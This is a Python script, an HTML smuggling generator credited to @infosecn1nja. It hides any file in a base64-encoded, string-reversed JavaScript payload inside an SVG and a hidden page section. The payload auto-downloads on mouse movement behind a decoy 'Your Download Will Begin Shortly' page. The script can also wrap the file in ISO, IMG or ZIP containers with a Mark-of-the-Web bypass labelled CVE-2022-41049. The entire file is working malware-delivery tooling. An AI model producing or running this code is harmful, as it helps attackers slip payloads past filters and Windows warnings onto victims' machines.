#!/usr/bin/python3
# -*- coding: utf-8 -*-

from io import BytesIO
from bs4 import BeautifulSoup
import zipfile, base64, sys, pycdlib
import argparse, magic, os

def html_template(targetFile, svg_payload, js_payload):
	soup = BeautifulSoup(open(targetFile), 'html.parser')
	js_tag = soup.new_tag("script")
	js_tag.string = js_payload

	section_tag = soup.new_tag("section")
	section_tag["id"] = "payload"
	section_tag["style"] = "display:none"
	section_tag.string = svg_payload

	soup.body.append(js_tag)
	soup.body.append(section_tag)

	return str(soup)

def make_iso(targetFile, ext):
	iso = pycdlib.PyCdlib()
	iso.new(interchange_level=4)

	targetfilenameFirst = targetFile.split(".")[0]
	targetFilenameExt = targetFile.split(".")[1]

	targetfilename = '{}.{}'.format(targetfilenameFirst, targetFilenameExt)
	targetfilehandle = open(targetfilename, 'rb')
	targetfilebody = targetfilehandle.read()

	iso.add_fp(BytesIO(targetfilebody), len(targetfilebody), '/' + targetfilename + ';1')

	iso.write('{}.{}'.format(targetfilenameFirst, ext))
	iso.close()

	return targetfilehandle.close()

def make_zip(targetFile, zipOutput):
	zip = zipfile.ZipFile(zipOutput, "w")
	zip.write(targetFile)
	zip.close()

def zip_motw_bypass(targetFile, targetZipFile):
	archive = zipfile.ZipFile(targetZipFile, "r")
	data = archive.read(targetFile)
	archive.close()

	zip = zipfile.ZipFile(targetZipFile, "w", zipfile.ZIP_DEFLATED)
	info = zipfile.ZipInfo(targetFile)
	info.create_system = 1
	info.external_attr = 33
	zip.writestr(info, data)
	zip.close()	

def generate(targetFile, container="", template=""):
	filename = ""

	if os.path.exists(targetFile) == False:
		print("[-] Target file not found")
		exit()
	else:
		print("[*] File {} successfully loaded".format(targetFile))	

	if container == "iso":
		print("[*] Creating an iso file")
		make_iso(targetFile, "iso")
		filename = targetFile.split(".")[0] + ".iso"
	elif container == "img":
		print("[*] Creating an img file")
		make_iso(targetFile, "img")
		filename = targetFile.split(".")[0] + ".img"		
	elif container == "zip":
		filename = targetFile.split(".")[0] + ".zip"
		print("[*] Creating a zip file")
		make_zip(targetFile, filename)
		print("[*] Applying MOTW Bypass")
		zip_motw_bypass(targetFile, filename)
	else:
		filename = targetFile

	binary = base64.b64encode(open(filename, "rb").read())
	mime = magic.Magic(mime=True)
	content_type = mime.from_file(filename)
	output = filename

	print("[*] Set content type {}".format(content_type))

	js_payload = """<script>//<![CDATA[
	var text = "%s";
	function base64ToArrayBuffer(base64) {
	  var binary_string = window.atob(base64);
	  var len = binary_string.length;

	  var bytes = new Uint8Array( len );
	  for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
	  return bytes.buffer;
	}
	function newFile(blob)
	{
	  var fname = "%s";
	  let file = new File([blob], fname, {type: "%s"});
	  if(window.navigator.msSaveOrOpenBlob) window.navigator.msSaveBlob(blob,fname);
	  else{
		  let exportUrl = URL.createObjectURL(file);
		  window.location.assign(exportUrl);
		  URL.revokeObjectURL(exportUrl);
	  }
	}
	function reverseString(str) {
      return str.split("").reverse().join("");
    }
    var blob = base64ToArrayBuffer(reverseString(text));
    newFile(blob);
    //]]> 
	</script>""" % (str(binary[::-1], "UTF-8"), output, content_type)

	svg_payload = """<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 500 500">
		%s</svg>""" % js_payload

	javascript ="""function init(){if(!document.getElementById("execute")){var e=document.getElementById("payload").innerHTML;let t=document.createElement("embed");t.setAttribute("src","data:image/svg+xml;base64,"+e),t.setAttribute("id","execute"),document.body.appendChild(t)}}document.addEventListener("mousemove",function(){init()});"""
	payload = str(base64.b64encode(svg_payload.encode("utf-8")), "UTF-8")

	if template != None:
		if os.path.exists(template) == False:
			print("[-] File HTML template not found")
			quit()
		else:
			return html_template(template, payload, javascript)
	else:
		html_result = """<!DOCTYPE html><html><head><meta charset="utf-8" /><meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1" /><title>Your Download Will Begin Shortly</title></head><body><h1>Thank You - Your Download Will Begin Shortly</h1><section style="display:none" id="payload">%s</section><script>%s</script></body></html>""" % (payload, javascript)
		return html_result

def banner():
	print("""
  ██████  ███▄ ▄███▓ █    ██   ▄████   ▄████  ██▓    ▓█████  ██▀███  
▒██    ▒ ▓██▒▀█▀ ██▒ ██  ▓██▒ ██▒ ▀█▒ ██▒ ▀█▒▓██▒    ▓█   ▀ ▓██ ▒ ██▒
░ ▓██▄   ▓██    ▓██░▓██  ▒██░▒██░▄▄▄░▒██░▄▄▄░▒██░    ▒███   ▓██ ░▄█ ▒
  ▒   ██▒▒██    ▒██ ▓▓█  ░██░░▓█  ██▓░▓█  ██▓▒██░    ▒▓█  ▄ ▒██▀▀█▄  
▒██████▒▒▒██▒   ░██▒▒▒█████▓ ░▒▓███▀▒░▒▓███▀▒░██████▒░▒████▒░██▓ ▒██▒
▒ ▒▓▒ ▒ ░░ ▒░   ░  ░░▒▓▒ ▒ ▒  ░▒   ▒  ░▒   ▒ ░ ▒░▓  ░░░ ▒░ ░░ ▒▓ ░▒▓░
░ ░▒  ░ ░░  ░      ░░░▒░ ░ ░   ░   ░   ░   ░ ░ ░ ▒  ░ ░ ░  ░  ░▒ ░ ▒░
░  ░  ░  ░      ░    ░░░ ░ ░ ░ ░   ░ ░ ░   ░   ░ ░      ░     ░░   ░ 
      ░         ░      ░           ░       ░     ░  ░   ░  ░   ░    
		HTML Smuggling Generator | by @infosecn1nja
	""")	

parser = argparse.ArgumentParser(description=banner())
parser.add_argument('-o', '--output', help="Ouput file name", required=True)
parser.add_argument('-f', '--file', help="Path to the file to embed into HTML", required=True)
parser.add_argument('-c', '--container', choices=['img','iso','zip'], help="Package payload into container, support format img, iso and zip (CVE-2022-41049) MOTW bypass")
parser.add_argument('-x', '--template', help="Path to HTML template")

args = parser.parse_args()

file = args.file
output = args.output
container = args.container
template = args.template

result = generate(file, container, template)

if output:
	try:
		with open(output,"w") as f:
			print("[*] File {} successfully created".format(output))
			f.write(result)
			f.close()
	except IOError:
		print("[-] Could not write output: {}".format(output))
		quit()
